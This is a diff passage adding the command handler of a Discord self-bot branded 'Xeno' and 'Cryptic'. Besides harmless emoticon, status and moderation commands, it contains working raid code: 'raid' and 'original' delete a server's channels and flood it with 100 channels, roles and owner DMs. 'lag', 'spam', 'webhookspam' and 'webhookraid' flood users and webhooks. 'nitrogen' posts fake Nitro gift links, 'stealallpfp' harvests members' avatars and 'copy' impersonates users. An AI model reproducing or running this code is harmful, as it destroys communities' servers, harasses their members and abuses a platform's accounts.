+        message.channel.send(stripIndents`\`\`\`
+            Face Commands
+
+            <> = required | [] = optional
+
+            ${prefix}lenny » Sends ( ͡° ͜ʖ ͡°) into the current channel
+            ${prefix}flip » Sends (╯°□°）╯︵ ┻━┻ into the current channel
+            ${prefix}unflip » Sends ┬─┬ ノ( ゜-゜ノ) into the current channel
+            ${prefix}shrug » Sends ¯\\_(ツ)_/¯ into the current channel${
+          footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+        }
+            \`\`\``);
+      }
+    }
+
+    if (cmd === "status") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Status Commands")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤").setDescription(`
+          <> = required | [] = optional
+      
+          **${prefix}listening <message>** » Sets your activity as listening with your message
+          **${prefix}playing <message>** » Sets your activity as playing with your message
+          **${prefix}stream <message>** » Sets your activity as streaming with your message
+          **${prefix}watching <message>** » Sets your activity as watching with your message
+          **${prefix}reset** » Resets your current activity
+          `);
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+          Status Commands
+
+          <> = required | [] = optional
+      
+          ${prefix}listening <message> » Sets your activity as listening with your message
+          ${prefix}playing <message> » Sets your activity as playing with your message
+          ${prefix}stream <message> » Sets your activity as streaming with your message
+          ${prefix}watching <message> » Sets your activity as watching with your message
+          ${prefix}reset » Resets your current activity${
+          footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+        }
+          \`\`\``);
+      }
+    }
+
+    if (cmd === "animals") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Animal Commands")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤").setDescription(`
+          <> = required | [] = optional
+      
+          **${prefix}cat** » Random cat image
+          **${prefix}dog** » Random dog image
+          **${prefix}fox** » Random fox image
+          `);
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+          Animal Commands
+
+          <> = required | [] = optional
+      
+          ${prefix}cat » Random cat image
+          ${prefix}dog » Random dog image
+          ${prefix}fox » Random fox image${footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"}
+          \`\`\``);
+      }
+    }
+
+    if (cmd === "abuse") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Abusive Commands [GUILD ONLY]")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤").setDescription(`
+          <> = required | [] = optional
+      
+          **${prefix}dmall** » Sends mostly everyone in the server a message of your choice
+          **${prefix}delchannels** » Deletes every-single channel in the server
+          **${prefix}delroles** » Deletes every-single role in the server
+          **${prefix}lag <user-id> <amount>** » Sends the user the specified amount of lag messages
+          **${prefix}masschannels** » Creates a whole bunch of random channels
+          **${prefix}massroles** » Creates a whole bunch of random roles
+          **${prefix}massban** » Bans everyone in the server (Not including the server owner or members with a higher rank/role)
+          **${prefix}masskick** » Kicks everyone in the server (Not including the server owner or members with a higher rank/role)
+          **${prefix}nitrogen <amount>** » Generates the amount of discord nitro codes
+          **${prefix}original** » Resets the entire server
+          **${prefix}raid** » Changes the server name, icon, creates 100 roles and makes 100 text and voice channels
+          **${prefix}spamall <message>** » Sends every channel a message
+          **${prefix}spam <amount> <message>** » Spams your message the specified amount of times
+          **${prefix}webhookspam <webhook-url> <true|false> <message>** » Spams the webhook 100 times with your message
+                    (true = mention everyone with your message, false = regular message without mention)`);
+        message.channel.send(embed);
+      } else {
+        message.channel.send(`\`\`\`
+Abusive Commands [GUILD ONLY]
+
+<> = required | [] = optional
+      
+${prefix}dmall » Sends mostly everyone in the server a message of your choice
+${prefix}delchannels » Deletes every-single channel in the server
+${prefix}delroles » Deletes every-single role in the server
+${prefix}lag <user-id> <amount> » Sends the user the specified amount of lag messages
+${prefix}masschannels » Creates a whole bunch of random channels
+${prefix}massroles » Creates a whole bunch of random roles
+${prefix}massban » Bans everyone in the server (Not including the server owner or members with a higher rank/role)
+${prefix}masskick » Kicks everyone in the server (Not including the server owner or members with a higher rank/role)
+${prefix}nitrogen <amount> » Generates the amount of discord nitro codes
+${prefix}original » Resets the entire server
+${prefix}raid » Changes the server name, icon, creates 100 roles and makes 100 text and voice channels
+${prefix}spamall <message> » Sends every channel a message
+${prefix}spam <amount> <message> » Spams your message the specified amount of times
+${prefix}webhookspam <webhook-url> <true|false> <message> » Spams the webhook 100 times with your message
+           (true = mention everyone with your message, false = regular message without mention)
+${prefix}webhookraid <amount> <message> » Spams @everyone the amount of times with your message
+         (Must have webhook url in the config file)${
+           footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+         }
+          \`\`\``);
+      }
+    }
+
+    if (cmd === "moderation") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Moderation Commands [GUILD ONLY]")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤").setDescription(`
+        <> = required | [] = optional
+      
+        **${prefix}addrole <role> <member>** » Gives the mentioned role to the mentioned member
+        **${prefix}createrole <hex-color> <name>** » Creates a new role with the color
+        **${prefix}deleterole <name>** » Delets the role from the server
+        **${prefix}rainbow <role>** » Edits that role to rainbow colors
+        **${prefix}removerole <role> <member>** » Removes the mentioned role from the mentioned member
+        **${prefix}ban <member> [reason]** » Bans the mentioned member from the server
+        **${prefix}kick <member> [reason]** » Kicks the mentioned member from the server
+        `);
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+      Moderation Commands [GUILD ONLY]
+
+      <> = required | [] = optional
+      
+        ${prefix}addrole <role> <member> » Gives the mentioned role to the mentioned member
+        ${prefix}createrole <hex-color> <name> » Creates a new role with the color
+        ${prefix}deleterole <name> » Delets the role from the server
+        ${prefix}rainbow <role> » Edits that role to rainbow colors
+        ${prefix}removerole <role> <member> » Removes the mentioned role from the mentioned member
+        ${prefix}ban <member> [reason] » Bans the mentioned member from the server
+        ${prefix}kick <member> [reason] » Kicks the mentioned member from the server${
+          footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+        }
+      \`\`\``);
+      }
+    }
+
+    if (cmd === "account") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Account Commands")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤").setDescription(`
+        <> = required | [] = optional
+      
+        **${prefix}copy <user>** » Sets your username and avatar as the mentioned users avatar
+        **${prefix}invisible** » Sets your username and avatar as something invisible
+        **${prefix}join <invite-code>** » Joins a discord server for you
+        **${prefix}read** » Marks every server that you are in as read
+        **${prefix}stealallpfp** » Gets everyones avatar and saves it into a json file on your desktop [GUILD ONLY]
+        **${prefix}stealpfp <user>** » Sets your avatar as the mentioned users avatar
+        `);
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+      Account Commands
+
+      <> = required | [] = optional
+      
+      ${prefix}copy <user> » Sets your username and avatar as the mentioned users avatar
+      ${prefix}invisible » Sets your username and avatar as something invisible
+      ${prefix}join <invite-code> » Joins a discord server for you
+      ${prefix}read » Marks every server that you are in as read
+      ${prefix}stealallpfp » Gets everyones avatar and saves it into a json file on your desktop [GUILD ONLY]
+      ${prefix}stealpfp <user> » Sets your avatar as the mentioned users avatar${
+          footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+        }
+      \`\`\``);
+      }
+    }
+
+    if (cmd === "read") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      bot.guilds.forEach((guild) => {
+        guild.acknowledge();
+      }, 3000);
+    }
+
+    if (cmd === "stealallpfp") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const avatars = message.guild.members.map(
+        (member) => `[${member.user.username}]: ${member.user.displayAvatarURL}`
+      );
+      fs.writeFileSync(
+        "../../../Desktop/avatars.json",
+        JSON.stringify(avatars)
+      );
+      message.channel.send(
+        `<@!${bot.user.id}>, Go and search for a file called \`avatars.json\` on your desktop`
+      );
+    }
+
+    if (cmd === "invisible") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!config.password)
+        return console.log(
+          `${colors.red("[ERROR]:")} ${colors.yellow(
+            "Invalid password was provided"
+          )}`
+        );
+      bot.user.setAvatar(
+        "https://i.gyazo.com/492beb29a2c0133311f6eaf63dfc6372.png",
+        config.password
+      );
+      bot.user.setUsername(" ˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞", config.password);
+    }
+
+    if (cmd === "copy") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const user = message.mentions.users.first();
+      if (!user) return message.channel.send("Please mention a user");
+      bot.user.setUsername(user.username);
+      bot.user.setAvatar(user.displayAvatarURL);
+    }
+
+    if (cmd === "stealpfp") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const user = message.mentions.users.first();
+      if (!user) return message.channel.send("Please mention a user");
+      bot.user.setAvatar(user.displayAvatarURL);
+    }
+
+    if (cmd === "massreact") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const emoji = args[0];
+      if (!args[0]) return message.channel.send("Please specify an emoji");
+      message.channel.messages.forEach((msg) => msg.react(emoji));
+    }
+
+    if (cmd === "spoiler") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!args.join(" "))
+        return message.channel.send("Please specify a message");
+      message.channel.send(
+        `||${message.content.slice(9).split("").join("||||")}||`
+      );
+    }
+
+    if (cmd === "ban") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const user = message.mentions.users.first();
+      const member = message.guild.member(user);
+      let reason = args.slice(1).join(" ");
+      if (!reason) reason = "No reason provied";
+
+      if (!message.guild.me.hasPermission("BAN_MEMBERS"))
+        return message.channel.send(
+          "Error! I do not have enough permissions to do that"
+        );
+      if (user) {
+        if (member) {
+          member.ban({ reason: reason }).then(() => {
+            message.channel.send(
+              `**${user.tag}** was successfully banned from this server`
+            );
+          });
+        } else {
+          message.channel.send("That user does not exist in this server");
+        }
+      } else {
+        message.channel.send("Please mention a user to ban");
+      }
+    }
+
+    if (cmd === "kick") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const user = message.mentions.users.first();
+      const member = message.guild.member(user);
+      let reason = args.slice(1).join(" ");
+      if (!reason) reason = "No reason provied";
+
+      if (!message.guild.me.hasPermission("KICK_MEMBERS"))
+        return message.channel.send(
+          "Error! I do not have enough permissions to do that"
+        );
+      if (user) {
+        if (member) {
+          member.kick(reason).then(() => {
+            message.channel.send(
+              `**${user.tag}** was successfully kicked from this server`
+            );
+          });
+        } else {
+          message.channel.send("That user does not exist in this server");
+        }
+      } else {
+        message.channel.send("Please mention a user to kick");
+      }
+    }
+
+    if (cmd === "createrole") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const roleColor = args[0];
+      const roleName = args.slice(1).join(" ");
+      if (!roleColor)
+        return message.channel.send("Please specify a role color");
+      if (!roleName) return message.channel.send("Please specify a role name");
+      message.guild.createRole({
+        name: roleName,
+        color: roleColor,
+      });
+      message.channel.send(`Successfully made the **${roleName}** role`);
+    }
+
+    if (cmd === "deleterole") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const roleName = message.guild.roles.find(
+        (role) => role.name === args.join(" ")
+      );
+      if (!args.join(" "))
+        return message.channel.send("Please specify a role name to delete");
+      if (!roleName) return message.channel.send("That role does not exist");
+      roleName.delete();
+      message.channel.send(
+        `Successfully deleted the **${args.join(" ")}** role`
+      );
+    }
+
+    if (cmd === "addrole") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const roleMention = message.mentions.roles.first();
+      const memberMention = message.mentions.members.first();
+      if (!roleMention) return message.channel.send("Please mention a role");
+      if (!memberMention)
+        return message.channel.send("Please mention a member");
+      memberMention.addRole(roleMention);
+      message.channel.send(
+        `Successfully added the **${roleMention.name}** role to **${memberMention.user.tag}**`
+      );
+    }
+
+    if (cmd === "removerole") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const roleMention = message.mentions.roles.first();
+      const memberMention = message.mentions.members.first();
+      if (!roleMention) return message.channel.send("Please mention a role");
+      if (!memberMention)
+        return message.channel.send("Please mention a member");
+      memberMention.removeRole(roleMention);
+      message.channel.send(
+        `Successfully removed the **${roleMention.name}** role from **${memberMention.user.tag}**`
+      );
+    }
+
+    if (cmd === "lenny") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      message.channel.send("( ͡° ͜ʖ ͡°)");
+    }
+
+    if (cmd === "flip") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      message.channel.send("(╯°□°）╯︵ ┻━┻");
+    }
+
+    if (cmd === "unflip") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      message.channel.send("┬─┬ ノ( ゜-゜ノ)");
+    }
+
+    if (cmd === "shrug") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      message.channel.send("¯\\_(ツ)_/¯");
+    }
+
+    if (cmd === "raid") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.guild.me.hasPermission("ADMINISTRATOR")) {
+        message.guild.setIcon(
+          "https://i.gyazo.com/e720243a3d6cd9425e8b97456263debd.png"
+        );
+        message.guild.setName("RAIDED BY CRYPTIC");
+        message.guild.channels.forEach((ch) => {
+          ch.delete();
+        });
+        for (var i = 0; i < 100; i++) {
+          message.guild.createChannel("raided-by-cryptic", {
+            type: "text",
+          });
+        }
+        for (var i = 0; i < 100; i++) {
+          const Guild = message.guild.name;
+          message.guild.members
+            .get(message.guild.ownerID)
+            .send(`Your server ${Guild} has been Raided :slight_smile:`)
+            .catch((err) => {
+              return;
+            });
+        }
+        for (var i = 0; i < 100; i++) {
+          message.guild.createChannel("Raided By Cryptic", {
+            type: "voice",
+          });
+        }
+        for (var i = 0; i < 100; i++) {
+          const newRole = await message.guild.createRole({
+            name: "RAIDED BY CRYPTIC",
+            color: "#1B78E7",
+          });
+          message.guild.members.forEach((member) => {
+            member.addRole(newRole.id);
+          });
+        }
+      }
+    }
+
+    if (cmd === "original") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      message.guild.setIcon(null);
+      message.guild.channels.forEach((ch) => ch.delete());
+      const textCat = await message.guild.createChannel("Text Channels", {
+        type: "category",
+      });
+      const voiceCat = await message.guild.createChannel("Voice Channels", {
+        type: "category",
+      });
+      message.guild.createChannel("general", {
+        type: "text",
+        parent: textCat.id,
+      });
+      message.guild.createChannel("General", {
+        type: "voice",
+        parent: voiceCat.id,
+      });
+    }
+
+    if (cmd === "msg") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const options = [
+        "bold",
+        "italics",
+        "underline",
+        "destroy",
+        "upper",
+        "lower",
+        "strikethrough",
+        "hidden",
+        "everything",
+      ];
+      if (!args[0])
+        return message.channel.send(
+          `Please provide one of these methods: ${options.join(", ")}`
+        );
+      if (!args[0].toLowerCase() === options)
+        return message.channel.send(
+          `Please provide one of these methods: ${options.join(", ")}`
+        );
+      if (!args.slice(1).join(" "))
+        return message.channel.send("Please provide a message.");
+      if (args[0].toLowerCase() === options[0]) {
+        message.channel.send(`**${args.slice(1).join(" ")}**`);
+      } else if (args[0].toLowerCase() === options[1]) {
+        message.channel.send(`*${args.slice(1).join(" ")}*`);
+      } else if (args[0].toLowerCase() === options[2]) {
+        message.channel.send(`__${args.slice(1).join(" ")}__`);
+      } else if (args[0].toLowerCase() === options[3]) {
+        message.channel.send(colors.trap(args.slice(1).join(" ")));
+      } else if (args[0].toLowerCase() === options[4]) {
+        message.channel.send(args.slice(1).join(" ").toUpperCase());
+      } else if (args[0].toLowerCase() === options[5]) {
+        message.channel.send(args.slice(1).join(" ").toLowerCase());
+      } else if (args[0].toLowerCase() === options[6]) {
+        message.channel.send(`~~${args.slice(1).join(" ")}~~`);
+      } else if (args[0].toLowerCase() === options[7]) {
+        message.channel.send(`||${args.slice(1).join(" ")}||`);
+      } else if (args[0].toLowerCase() === options[8]) {
+        message.channel.send(
+          `~~__***||${colors.trap(
+            args.slice(1).join(" ").toUpperCase()
+          )}||***__~~`
+        );
+      }
+    }
+
+    if (cmd === "spam") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!args[0] || !/\d{1,2}/gi.test(args[0])) {
+        return message.channel.send(
+          "Please specify the amount of messages to spam."
+        );
+      } else {
+        var spamAmount = args[0];
+      }
+      if (!args[1]) {
+        return message.channel.send("Please provide a message.");
+      } else {
+        args.splice(0, 1);
+        var spamContent = args.join(" ");
+      }
+      for (var i = 0; i < spamAmount; i++) {
+        message.channel.send(spamContent);
+      }
+    }
+
+    if (cmd === "lag") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const user = message.mentions.users.first();
+      if (!user) return message.channel.send("Please mention a user");
+      const spamAmount = args.slice(1).join(" ");
+      if (!spamAmount)
+        return message.channel.send(
+          "Please specify the amount of messages to send"
+        );
+      for (var i = 0; i < spamAmount; i++) {
+        user.send(
+          ":chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains:"
+        );
+      }
+    }
+
+    if (cmd === "nitrogen") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!args[0])
+        return message.channel.send(
+          "Please specify the amount of nitro codes you want to generate"
+        );
+      const spamAmount = args[0];
+      function nitroCode() {
+        let code = "";
+        let dict =
+          "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        for (var i = 0; i < 19; i++) {
+          code = code + dict.charAt(Math.floor(Math.random() * dict.length));
+        }
+        return code;
+      }
+      for (var i = 0; i < spamAmount; i++) {
+        message.channel.send(`https://discord.gift/${nitroCode()}`);
+      }
+    }
+
+    if (cmd === "webhookraid") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!config.webhookURL)
+        return console.log(
+          `${colors.red("[ERROR]:")} ${colors.yellow(
+            "Webhook URL not specified in config.json"
+          )}`
+        );
+      const spamAmount = args[0];
+      const spamContent = args.slice(1).join(" ");
+      if (!spamAmount)
+        return message.channel.send(
+          "Please specify the amount of messages to spam!"
+        );
+      if (!spamContent) return message.channel.send("Please provide a message");
+      if (`[${message.guild.nameAcronym}] ${message.guild.name}`.length > 40)
+        return console.log(
+          `${colors.red(`[ERROR]:`)} ${colors.yellow(`Guild name is to long`)}`
+        );
+
+      const cryptic = new webhook.Webhook(config.webhookURL);
+      for (var i = 0; i < spamAmount; i++) {
+        const hook = new webhook.MessageBuilder()
+          .setName(`[${message.guild.nameAcronym}] ${message.guild.name}`)
+          .setAvatar(message.guild.iconURL)
+          .setText("@everyone")
+          .setTitle("You've just been raided")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤")
+          .setDescription(spamContent);
+        cryptic.send(hook);
+      }
+    }
+
+    if (cmd === "webhookspam") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      let spamMsg;
+      const hookURL = args[0];
+      const mention = args[1];
+      if (!mention == "true" || !mention == "false")
+        return message.channel.send("Mention must be true or false");
+      if (mention === "true")
+        spamMsg = `@everyone | ${args.slice(2).join(" ")}`;
+      if (mention === "false") spamMsg = args.slice(2).join(" ");
+      if (!hookURL.startsWith("https://discord.com/api/webhooks/"))
+        return message.channel.send("Invalid webhook url");
+
+      const raidedWebhook = new webhook.Webhook(hookURL);
+      for (var i = 0; i < 100; i++) {
+        const spamWebhook = new webhook.MessageBuilder()
+          .setText(spamMsg)
+          .setName("Imagine being raided");
+        raidedWebhook.send(spamWebhook);
+      }
+    }
+
+    if (cmd === "whois") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!message.guild)
+        return message.author.send(
+          "This command cannot be executed in Direct Messages or in Private Groups."
+        );
+      const user = message.mentions.users.first() || message.author;
+      const member = message.guild.member(user);
+      const perms = member.permissions
+        .toArray()
+        .map((str) =>
+          str
+            .replace(/_/g, " ")
+            .toLowerCase()
+            .replace(/\b(\w)/g, (char) => char.toUpperCase())
+        )
+        .join(", ");
+      const role = member.roles.map((r) => r).join(", ");
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle(`${user.username} Info`)
+          .setDescription(`Here is some information on ${user.tag}`)
+          .setThumbnail(user.displayAvatarURL)
+          .setColor(member.highestRole.color || "202225")
+          .addField("Username", user.username, true)
+          .addField("Discriminator", user.discriminator, true)
+          .addField("ID", user.id, true)
+          .addField(
+            "Account Created",
+            moment(user.createdAt).format("MMMM Do YYYY, h:mm A"),
+            true
+          )
+          .addField(`[${member.roles.size}] Total Roles`, role)
+          .addField("Guild Permissions", perms)
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤")
+          .setTimestamp();
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+            ${user.username} Info
+            Here is some information on ${user.tag}
+
+            Username: ${user.username}
+            Discriminator: ${user.discriminator}
+            ID: ${user.id}
+            Account Created: ${moment(user.createdAt).format(
+              "MMMM Do YYYY, h:mm A"
+            )}
+            Total Roles: ${member.roles.size}
+            Guild Permissions: ${perms}${footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"}
+            \`\`\``);
+      }
+    }
+
+    if (cmd === "uptime") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      var ms = bot.uptime;
+      var sec = Math.floor((ms / 1000) % 60);
+      var min = Math.floor((ms / 1000 / 60) % 60);
